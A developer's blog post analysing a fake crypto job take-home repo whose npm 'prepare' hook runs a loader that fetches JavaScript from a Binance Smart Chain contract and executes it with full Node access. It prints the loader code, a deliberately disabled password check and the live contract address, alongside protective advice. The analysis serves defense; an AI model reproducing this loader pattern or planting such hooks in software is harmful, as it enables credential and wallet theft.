---
layout: post
title: "Anatomy of a Crypto Job Scam: How One npm Install Can Drain Your Wallet"
description: "I got sent a GitHub repo as a take-home coding assignment. Turns out it fetches malware from the blockchain and executes it when you run npm install."
date: 2026-02-25
author: "Jo Vinkenroye"
categories: [Security]
tags: [Security, Web3, Crypto, Malware, Node.js, Scam]
image: /images/crypto-job-scam-malware-cover.png
featured: true
canonical_url: https://jovweb.dev/blog/anatomy-of-a-crypto-job-scam
---

A recruiter hit me up about a Web3 developer position at Limit Break. Good salary, interesting project, the whole package

They sent me a GitHub repo to review as a take-home assignment. A poker platform built with React, Express, Socket.io, and ethers.js

I almost ran it

Instead I decided to audit the code first. What I found was a sophisticated malware delivery system that hides its payload on the Binance Smart Chain and executes it the moment you type `npm install`

This is the full breakdown of how it works

## The Setup

The repo lives at `github.com/LimitBreakOrgs/bet_ver_1`. At first glance it looks completely legit. Clean folder structure, proper README, real dependencies, hundreds of lines of game logic

```
bet_ver_1/
├── server/          # Express backend
│   ├── controllers/ # Auth, chips, users, collection
│   ├── middleware/   # JWT, rate limiting, sanitization
│   ├── pokergame/   # Table, Player, Deck classes
│   └── socket/      # Socket.io game events
├── src/             # React frontend
│   ├── components/  # Poker table UI, cards, betting
│   ├── context/     # State management
│   └── utils/       # MetaMask wallet integration
└── package.json
```

It even has security middleware set up — mongo sanitization, XSS protection, rate limiting, JWT auth. Someone put real effort into making this look like a production codebase

## The First Red Flags

When I started digging I noticed things that didn't add up

**The GitHub org is fake.** The real Limit Break is at [github.com/limitbreakinc](https://github.com/limitbreakinc) with 18 repos, Solidity smart contracts, and years of history. "LimitBreakOrgs" has exactly one repo, zero public members, created two weeks ago

**Chess events in a poker game.** The socket packet file defines events like `CS_SelectPiece`, `CS_PerformMove`, `CS_PawnTransform`. These are chess events. In a poker application. The code was clearly copy-pasted from multiple unrelated projects

**Authentication is broken on purpose.** In the auth controller the password check is hardcoded:

```javascript
// server/controllers/auth.js
const isMatch = true;  // should be: await bcrypt.compare(password, user.password)
```

Any password works for any account. This isn't a bug — you don't accidentally write `const isMatch = true` and skip the bcrypt import

**The `.env` file is committed.** The `.gitignore` excludes `.env.local` but not `.env` itself. The file is right there in the repo with API keys and secrets. They want you to think "oh cool it's ready to run, I just need to install"

## The Trap: package.json

Here's where it gets interesting. Look at the scripts section:

```json
{
  "scripts": {
    "start": "node server/server.js | react-scripts start",
    "prepare": "node server/server.js"
  }
}
```

The `prepare` lifecycle script runs **automatically during `npm install`**. Not `npm start`. Not `npm run build`. Just `npm install`

The moment you install dependencies, `server/server.js` executes

## The Payload: Blockchain-Hosted Malware

`server.js` looks normal. Express app, middleware, routes, Socket.io. But at the end of startup it calls one function:

```javascript
// server/server.js
const { configureCollection } = require("./controllers/collection");

// ... normal express setup ...

startServer();  // inside the listen callback:
configureCollection();  // <-- this is the trigger
```

And here's `configureCollection`:

```javascript
// server/controllers/collection.js
const { ethers } = require("ethers");

const NFT_CONTRACT_ADDRESS = process.env.NFT_CONTRACT_ADDRESS;
const CONTRACT_ABI = [
    "function getMemo(uint256) view returns (string)"
];
const TX_ID = 1;
const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);

async function configureCollection() {
    const contract = new ethers.Contract(
        NFT_CONTRACT_ADDRESS, CONTRACT_ABI, provider
    );
    const memo = await contract.getMemo(TX_ID);
    ContentAsWeb(memo);
}
```

It connects to a smart contract on Binance Smart Chain at address `0xE251b37Bac8D85984d96da55dc977A609716EBDc`. It reads a `memo` field from transaction ID 1. That memo contains a string

A string of JavaScript code

Then it executes it:

```javascript
function ContentAsWeb(payload) {
    if (!payload || typeof payload !== "string") return;

    try {
        new Function(payload);  // validates it's parseable JS
    } catch (err) { return; }

    try {
        const ensureWeb = new Function("require", payload);
        ensureWeb(require);  // executes with full Node.js access
    } catch (err) {
        console.error("ensureWeb error", err.message);
    }
}
```

`new Function("require", payload)` creates a function from the string fetched from the blockchain. Then `ensureWeb(require)` executes it — passing in Node.js `require` so the payload can import any module it wants

## Why This Is Brilliant (and Terrifying)

This design is clever for several reasons:

**The malware isn't in the repo.** GitHub's security scanners, npm audit, and any static analysis tool will find nothing. The actual payload lives on-chain

**It's mutable.** The attacker can update the smart contract's memo field at any time. Today it might steal wallets. Tomorrow it might install a keylogger. The repo never changes

**It uses `new Function()` instead of `eval()`.** Most linters and security tools flag `eval()`. Fewer flag `new Function()` even though it's equally dangerous

**The function names are camouflaged.** `configureCollection`, `ContentAsWeb`, `ensureWeb` — these all sound like legitimate utility functions. You'd have to read every line carefully to notice what they actually do

**It passes `require` explicitly.** `new Function()` doesn't have access to the module scope by default. By passing `require` as a parameter, they give the payload full access to Node.js — filesystem, networking, child processes, everything

## What the Payload Can Do

With `require` available, the on-chain JavaScript can:

- `require('fs')` — Read your SSH keys, wallet files, `.env` files, browser profiles
- `require('child_process')` — Run any shell command on your machine
- `require('https')` — Send everything to the attacker's server
- `require('os')` — Fingerprint your machine, find your home directory
- `require('path')` — Navigate to known wallet locations

The typical target list for these attacks: MetaMask vaults, Phantom wallet data, SSH private keys, AWS credentials, browser cookies, password manager databases

## The Bigger Picture

This isn't a one-off. This is the **Contagious Interview** campaign, widely attributed to North Korea's Lazarus Group. They've been running variations of this since 2024 and have stolen millions

The playbook is always the same:

1. Create a fake company profile or impersonate a real one
2. Approach developers on LinkedIn/Telegram with a job offer
3. Conduct a convincing interview process
4. Send a "take-home assignment" GitHub repo
5. The repo runs malware on install or startup
6. Drain wallets, steal credentials, install persistent backdoors

They specifically target crypto developers because crypto developers tend to have crypto wallets on their development machines

## How to Protect Yourself

**Before running any interview take-home:**

1. **Verify the company.** Check the actual GitHub org, not just the name. Cross-reference with LinkedIn, the company website, and Crunchbase
2. **Read `package.json` first.** Look at `prepare`, `preinstall`, `postinstall`, and `install` scripts. If any of them run server code, that's a red flag
3. **Search for `new Function`, `eval`, `child_process`, and `exec`.** These are common payload execution patterns
4. **Check for blockchain calls in non-blockchain projects.** A poker app doesn't need `ethers.js` connecting to BSC at startup
5. **Use a sandbox.** Docker container, VM, or at minimum a separate user account with no access to your wallets or credentials
6. **Check the .gitignore.** If `.env` is committed with real-looking keys, they want you to run it as-is without thinking

**General hygiene:**

- Never keep hot wallets on your development machine
- Use hardware wallets for any significant holdings
- Keep SSH keys passphrase-protected
- Don't store API keys in environment variables on your main machine

## The Contract

For the security researchers reading this, the malicious contract is at:

- **Address:** `0xE251b37Bac8D85984d96da55dc977A609716EBDc`
- **Network:** Binance Smart Chain (RPC: `bsc-dataseed1.binance.org`)
- **Method:** `getMemo(uint256)` with TX_ID `1`
- **Repo:** `github.com/LimitBreakOrgs/bet_ver_1`

If you're analyzing this, do it in an isolated environment

## Final Thought

I got lucky because I'm paranoid about running other people's code. Not everyone is. If you're a developer getting job offers in crypto, the code review starts with the take-home assignment itself — not the code inside it

Stay safe out there
